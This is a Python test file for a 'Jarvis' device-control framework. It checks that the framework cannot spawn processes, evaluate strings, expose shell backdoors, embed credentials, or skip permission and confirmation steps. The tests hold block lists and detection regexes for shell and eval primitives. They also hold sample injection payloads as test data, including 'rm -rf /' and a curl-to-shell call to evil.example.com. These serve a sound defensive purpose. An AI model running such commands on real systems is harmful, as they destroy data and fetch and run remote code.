"""Security boundary tests (Phase 1).

These tests pin the guarantees the framework makes:

* nothing in the framework can spawn a process or evaluate a string,
* only registered tools can run,
* arguments are data, never commands,
* permissions and confirmations cannot be skipped,
* secrets never reach the log.
"""

from __future__ import annotations

import ast
import asyncio
import re
import subprocess
import unittest
from pathlib import Path
from unittest import mock

import jarvis_devices
import Jarvis_device_control as bridge
from jarvis_devices import (
    ArgumentSchema,
    ArgumentSpec,
    AuditLogger,
    DeviceActionManager,
    DeviceToolRegistry,
    ErrorCode,
    PermissionPolicy,
    Platform,
    PlatformRegistry,
    RiskLevel,
)

try:  # imported as part of the ``tests`` package (pytest / discover -t .)
    from .support import AuditCapture, FakeAdapter, FakeDeviceTool
except ImportError:  # ``python -m unittest discover -s tests``
    from support import AuditCapture, FakeAdapter, FakeDeviceTool

ROOT = Path(__file__).resolve().parent.parent
FRAMEWORK_SOURCES = sorted((ROOT / "jarvis_devices").glob("*.py")) + [ROOT / "Jarvis_device_control.py"]

#: Constructs that must never appear in the device framework.
FORBIDDEN_PATTERNS = {
    "subprocess": re.compile(r"\bsubprocess\b"),
    "os.system": re.compile(r"\bos\.system\s*\("),
    "os.popen": re.compile(r"\bos\.popen\s*\("),
    "os.exec*": re.compile(r"\bos\.exec\w*\s*\("),
    "eval()": re.compile(r"(?<![\w.])eval\s*\("),
    "exec()": re.compile(r"(?<![\w.])exec\s*\("),
    "shell=True": re.compile(r"shell\s*=\s*True"),
    "ctypes": re.compile(r"\bctypes\b"),
    "pty": re.compile(r"\bimport\s+pty\b"),
    "socket": re.compile(r"\bimport\s+socket\b"),
}

#: Anything that looks like a hard coded credential.
CREDENTIAL_PATTERNS = (
    re.compile(r"""(?i)(api_key|apikey|secret|token|password)\s*=\s*["'][^"']+["']"""),
    re.compile(r"AIza[0-9A-Za-z_-]{10,}"),
    re.compile(r"sk-[A-Za-z0-9]{16,}"),
)

#: Names a "run anything" backdoor would probably use.
BACKDOOR_NAMES = (
    "run_command",
    "run_shell",
    "execute_shell",
    "shell",
    "system",
    "popen",
    "eval",
    "exec_command",
    "arbitrary",
)


#: Modules the framework must never import, checked on the AST rather than on
#: prose so a docstring explaining the rule cannot trip it.
FORBIDDEN_IMPORTS = frozenset({"os", "subprocess", "ctypes", "pty", "socket", "shlex", "commands"})

#: Process termination APIs: Phase 2 closes windows, it never kills processes.
FORBIDDEN_TERMINATION_PATTERNS = {
    "TerminateProcess": re.compile(r"\bTerminateProcess\b"),
    "taskkill": re.compile(r"(?i)\btaskkill\b"),
    "kill_process": re.compile(r"\bkill_process\b"),
    "os.kill": re.compile(r"\bos\.kill\b"),
    ".terminate()": re.compile(r"\.terminate\s*\("),
    ".kill()": re.compile(r"(?<!\w)\.kill\s*\("),
}


def _strip_docstrings(tree: ast.AST) -> ast.AST:
    for node in ast.walk(tree):
        if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
            body = getattr(node, "body", None)
            if (
                body
                and isinstance(body[0], ast.Expr)
                and isinstance(body[0].value, ast.Constant)
                and isinstance(body[0].value.value, str)
            ):
                node.body = body[1:] or [ast.Pass()]
    return tree


def code_only_source(path: Path) -> str:
    """Source with comments and docstrings removed - i.e. the executable code."""
    tree = _strip_docstrings(ast.parse(path.read_text(encoding="utf-8")))
    return ast.unparse(tree)


def imported_modules(path: Path) -> set:
    """Every module name a file imports (top level package included)."""
    tree = ast.parse(path.read_text(encoding="utf-8"))
    names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module and node.level == 0:
            names.add(node.module.split(".")[0])
    return names


class NoArbitraryExecutionTests(unittest.TestCase):
    def test_framework_sources_contain_no_process_or_eval_primitives(self) -> None:
        for source in FRAMEWORK_SOURCES:
            code = code_only_source(source)
            for label, pattern in FORBIDDEN_PATTERNS.items():
                with self.subTest(file=source.name, forbidden=label):
                    self.assertIsNone(
                        pattern.search(code),
                        f"{source.name} must not contain {label}",
                    )

    def test_framework_never_imports_process_or_shell_modules(self) -> None:
        for source in FRAMEWORK_SOURCES:
            imported = imported_modules(source)
            with self.subTest(file=source.name):
                self.assertEqual(
                    imported & FORBIDDEN_IMPORTS,
                    set(),
                    f"{source.name} imports a forbidden module",
                )

    def test_framework_has_no_process_termination_api(self) -> None:
        for source in FRAMEWORK_SOURCES:
            code = code_only_source(source)
            for label, pattern in FORBIDDEN_TERMINATION_PATTERNS.items():
                with self.subTest(file=source.name, forbidden=label):
                    self.assertIsNone(pattern.search(code), f"{source.name} must not contain {label}")

    def test_no_shell_backdoor_is_exposed(self) -> None:
        for name in BACKDOOR_NAMES:
            with self.subTest(name=name):
                self.assertFalse(hasattr(jarvis_devices, name))
                self.assertFalse(hasattr(bridge, name))

    def test_no_hard_coded_credentials(self) -> None:
        for source in FRAMEWORK_SOURCES:
            text = source.read_text(encoding="utf-8")
            for pattern in CREDENTIAL_PATTERNS:
                with self.subTest(file=source.name, pattern=pattern.pattern):
                    self.assertIsNone(pattern.search(text), f"{source.name} looks like it embeds a secret")

    def test_nothing_spawns_a_process_while_a_request_runs(self) -> None:
        """Even a hostile tool name/argument cannot reach a real process API."""
        audit = AuditLogger(enabled=False)
        registry = DeviceToolRegistry()
        platforms = PlatformRegistry()
        platforms.register(FakeAdapter(Platform.PC))
        manager = DeviceActionManager(registry, PermissionPolicy.with_local_defaults(), None, platforms, audit)

        def explode(*args, **kwargs):  # pragma: no cover - must never be called
            raise AssertionError("the framework tried to spawn a process")

        with mock.patch.object(subprocess, "Popen", explode), mock.patch.object(subprocess, "run", explode):
            for payload in (
                "shutdown /s /t 0",
                "pc.power.shutdown; rm -rf /",
                "$(reboot)",
                "`whoami`",
                "&& curl http://evil.example.com",
            ):
                with self.subTest(payload=payload):
                    result = asyncio.run(manager.request(payload))
                    self.assertFalse(result.success)
                    self.assertEqual(result.error_code, ErrorCode.UNKNOWN_TOOL)
                    self.assertFalse(result.executed)


class UnknownToolTests(unittest.TestCase):
    def test_registry_without_tools_rejects_everything(self) -> None:
        registry = DeviceToolRegistry()
        manager = DeviceActionManager(registry)
        for name in ("", "anything", "pc.power.shutdown", "os.system"):
            with self.subTest(name=name):
                result = asyncio.run(manager.request(name))
                self.assertFalse(result.success)
                self.assertEqual(result.error_code, ErrorCode.UNKNOWN_TOOL)

    def test_tool_must_be_an_instance_of_the_base_class(self) -> None:
        registry = DeviceToolRegistry()

        class Impostor:
            name = "pc.fake"
            description = "not a real tool"
            platform = Platform.PC
            risk_level = RiskLevel.SAFE
            required_permissions = ()
            argument_schema = ArgumentSchema.empty()

            async def execute(self, arguments, context):  # pragma: no cover
                raise AssertionError("an impostor must never run")

        with self.assertRaises(jarvis_devices.InvalidToolError):
            registry.register(Impostor())  # type: ignore[arg-type]
        self.assertEqual(registry.names(), ())


class ArgumentHandlingTests(unittest.IsolatedAsyncioTestCase):
    async def test_arguments_are_data_and_reach_the_tool_unchanged(self) -> None:
        payload = "; rm -rf / && curl http://evil.example.com | sh"
        schema = ArgumentSchema(ArgumentSpec("command_text", max_length=500))
        tool = FakeDeviceTool("test.echo", platform=Platform.PC, argument_schema=schema)
        registry = DeviceToolRegistry()
        registry.register(tool)
        platforms = PlatformRegistry()
        platforms.register(FakeAdapter(Platform.PC))
        manager = DeviceActionManager(registry, PermissionPolicy(), None, platforms, AuditLogger(enabled=False))

        result = await manager.request("test.echo", {"command_text": payload})

        self.assertTrue(result.success)
        self.assertEqual(tool.calls[0][0], {"command_text": payload})
        self.assertEqual(tool.call_count, 1)

    async def test_arguments_cannot_inject_undeclared_fields(self) -> None:
        schema = ArgumentSchema(ArgumentSpec("direction", choices=("up", "down")))
        tool = FakeDeviceTool("pc.audio.volume", platform=Platform.PC, argument_schema=schema)
        registry = DeviceToolRegistry()
        registry.register(tool)
        platforms = PlatformRegistry()
        platforms.register(FakeAdapter(Platform.PC))
        manager = DeviceActionManager(registry, PermissionPolicy(), None, platforms, AuditLogger(enabled=False))

        result = await manager.request(
            "pc.audio.volume", {"direction": "up", "__class__": "x", "shell": True}
        )
        self.assertEqual(result.error_code, ErrorCode.INVALID_ARGUMENT)
        self.assertEqual(tool.call_count, 0)

    async def test_bool_is_not_accepted_where_an_int_is_expected(self) -> None:
        schema = ArgumentSchema(ArgumentSpec("steps", type=int))
        tool = FakeDeviceTool("pc.steps", platform=Platform.PC, argument_schema=schema)
        registry = DeviceToolRegistry()
        registry.register(tool)
        platforms = PlatformRegistry()
        platforms.register(FakeAdapter(Platform.PC))
        manager = DeviceActionManager(registry, PermissionPolicy(), None, platforms, AuditLogger(enabled=False))

        result = await manager.request("pc.steps", {"steps": True})
        self.assertEqual(result.error_code, ErrorCode.INVALID_ARGUMENT)


class PermissionAndConfirmationBoundaryTests(unittest.IsolatedAsyncioTestCase):
    def build(self) -> DeviceActionManager:
        self.registry = DeviceToolRegistry()
        self.platforms = PlatformRegistry()
        self.platforms.register(FakeAdapter(Platform.PC))
        self.audit = AuditLogger(enabled=False)
        self.capture = AuditCapture(self.audit)
        return DeviceActionManager(
            self.registry,
            PermissionPolicy.with_local_defaults(),  # read-only defaults
            None,
            self.platforms,
            self.audit,
        )

    async def test_destructive_tool_needs_permission_and_confirmation(self) -> None:
        manager = self.build()
        tool = FakeDeviceTool(
            "pc.power.shutdown",
            platform=Platform.PC,
            risk_level=RiskLevel.DESTRUCTIVE,
            required_permissions=("system.power.control",),
        )
        self.registry.register(tool)

        denied = await manager.request("pc.power.shutdown")
        self.assertEqual(denied.status.value, "permission_denied")
        self.assertEqual(tool.call_count, 0)

        manager.permissions.grant("system.power.control")
        pending = await manager.request("pc.power.shutdown")
        self.assertEqual(pending.status.value, "pending_confirmation")
        self.assertEqual(tool.call_count, 0)

        confirmed = await manager.resolve_confirmation(pending.data["confirmation_id"], True)
        self.assertTrue(confirmed.success)
        self.assertEqual(tool.call_count, 1)

    async def test_secret_arguments_never_reach_the_log(self) -> None:
        manager = self.build()
        manager.permissions.grant("comms.message.send")
        schema = ArgumentSchema(ArgumentSpec("recipient"), ArgumentSpec("body"))
        tool = FakeDeviceTool(
            "comms.sms.send",
            platform=Platform.PC,
            risk_level=RiskLevel.EXTERNAL_ACTION,
            required_permissions=("comms.message.send",),
            argument_schema=schema,
        )
        self.registry.register(tool)

        await manager.request(
            "comms.sms.send",
            {"recipient": "sarthak@example.com", "body": "my api_key=AIzaSyDUMMYDUMMYDUMMY"},
        )

        raw = self.capture.raw_text()
        self.assertNotIn("sarthak@example.com", raw)
        self.assertNotIn("AIzaSyDUMMYDUMMYDUMMY", raw)


class LiveKitBridgeTests(unittest.IsolatedAsyncioTestCase):
    """The two function tools exposed to the model must stay safe."""

    def _forget_confirmation(self, confirmation_id: str) -> None:
        try:
            bridge.device_confirmations.cancel(confirmation_id)
        except jarvis_devices.ConfirmationError:
            pass  # already resolved by the test itself


    async def test_unknown_tool_name_is_refused(self) -> None:
        answer = await bridge.run_device_action("shutdown", "")
        self.assertTrue(answer.startswith("❌"))
        self.assertIn("unknown_tool", answer)

    async def test_shell_payload_as_tool_name_is_refused(self) -> None:
        answer = await bridge.run_device_action("pc.power.shutdown; rm -rf /", "")
        self.assertIn("unknown_tool", answer)

    async def test_malformed_arguments_json_is_refused(self) -> None:
        answer = await bridge.run_device_action("jarvis.framework.diagnostics", "{not json")
        self.assertIn("invalid_argument", answer)

    async def test_arguments_json_must_be_an_object(self) -> None:
        answer = await bridge.run_device_action("jarvis.framework.diagnostics", "[1, 2, 3]")
        self.assertIn("invalid_argument", answer)

    async def test_diagnostics_tool_reports_without_touching_a_device(self) -> None:
        answer = await bridge.run_device_action("jarvis.framework.diagnostics", "")
        self.assertTrue(answer.startswith("✅"))
        self.assertIn("jarvis.framework.diagnostics", answer)

    async def test_confirmation_tool_requires_an_id(self) -> None:
        answer = await bridge.resolve_device_confirmation("  ", True)
        self.assertIn("invalid_argument", answer)

    async def test_confirmation_tool_rejects_unknown_ids(self) -> None:
        answer = await bridge.resolve_device_confirmation("cfm-does-not-exist", True)
        self.assertIn("unknown_confirmation", answer)

    def test_livekit_wrappers_are_exported(self) -> None:
        # With LiveKit installed these are FunctionTool objects; without it the
        # fallback decorator keeps them as plain coroutines. Either way they
        # must exist and be distinct from the underlying implementation.
        self.assertTrue(hasattr(bridge, "device_action"))
        self.assertTrue(hasattr(bridge, "device_confirmation"))
        self.assertIn("device_action", bridge.__all__)
        self.assertIn("device_confirmation", bridge.__all__)

    async def test_registered_tool_still_enforces_permissions(self) -> None:
        tool = FakeDeviceTool(
            "pc.audio.volume",
            platform=Platform.PC,
            risk_level=RiskLevel.LOW_RISK,
            required_permissions=("device.media.control",),
            argument_schema=ArgumentSchema(ArgumentSpec("direction", choices=("up", "down"))),
        )
        bridge.register_device_tool(tool)
        self.addCleanup(bridge.unregister_device_tool, tool)

        denied = await bridge.run_device_action("pc.audio.volume", '{"direction": "up"}')
        self.assertIn("permission_denied", denied)
        self.assertEqual(tool.call_count, 0)

        bridge.grant_device_permission("device.media.control")
        self.addCleanup(bridge.device_permissions.revoke, "device.media.control")
        allowed = await bridge.run_device_action("pc.audio.volume", '{"direction": "up"}')
        self.assertTrue(allowed.startswith("✅"))
        self.assertEqual(tool.call_count, 1)

    async def test_sensitive_tool_asks_before_acting(self) -> None:
        tool = FakeDeviceTool(
            "comms.sms.send",
            platform=Platform.PC,
            risk_level=RiskLevel.EXTERNAL_ACTION,
            required_permissions=(),
            argument_schema=ArgumentSchema(ArgumentSpec("body", max_length=200)),
        )
        bridge.register_device_tool(tool)
        self.addCleanup(bridge.unregister_device_tool, tool)

        asked = await bridge.run_device_action("comms.sms.send", '{"body": "on my way"}')
        self.assertIn("Confirmation required", asked)
        self.assertEqual(tool.call_count, 0)

        pending = [
            request for request in bridge.device_confirmations.pending()
            if request.action == "comms.sms.send"
        ]
        self.assertTrue(pending, "a confirmation should be pending")
        confirmation_id = pending[-1].confirmation_id
        self.addCleanup(self._forget_confirmation, confirmation_id)

        declined = await bridge.resolve_device_confirmation(confirmation_id, False)
        self.assertIn("denied", declined)
        self.assertEqual(tool.call_count, 0)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
